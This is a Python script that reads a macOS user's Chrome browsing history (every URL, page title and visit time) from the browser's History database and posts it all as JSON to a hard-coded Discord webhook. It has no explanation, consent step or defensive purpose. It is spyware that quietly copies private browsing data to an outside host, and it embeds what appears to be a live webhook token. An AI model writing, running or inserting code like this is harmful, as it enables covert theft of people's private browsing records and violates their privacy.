import sqlite3
import os
import datetime
import json
import requests

# Get the path to the user's Chrome history database
data_path = os.path.expanduser('~') + "/Library/Application Support/Google/Chrome/Default"
files = os.listdir(data_path)
history_db = os.path.join(data_path, 'History')

# Establish a connection to the Chrome history database
connection = sqlite3.connect(history_db)
cursor = connection.cursor()

# Retrieve the URL, title, and visit time for each history item
select_statement = "SELECT urls.url, urls.title, visits.visit_time FROM urls, visits WHERE urls.id = visits.url;"
cursor.execute(select_statement)
results = cursor.fetchall()

# Create a list of dictionaries representing each history item
history_items = []
for row in results:
    url = row[0]
    title = row[1]
    timestamp = row[2] / 1000000
    visit_time = datetime.datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S")
    history_items.append({"url": url, "title": title, "visit_time": visit_time})

# Close the database connection
connection.close()

# Send the history data to a Discord webhook
webhook_url = "https://discord.com/api/webhooks/1089245450760097995/1sH24u4b4epfXkh3goi45cH4CFOhoz6bvkHROD5y75gcHYkmg3madp9FcQyY7FHGEhHx"
payload = {"content": "Chrome History:\n" + json.dumps(history_items, indent=4)}
response = requests.post(webhook_url, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
if response.status_code == 204:
    print("History data sent to Discord webhook successfully.")
else:
    print(f"Failed to send history data to Discord webhook. Response code: {response.status_code}")
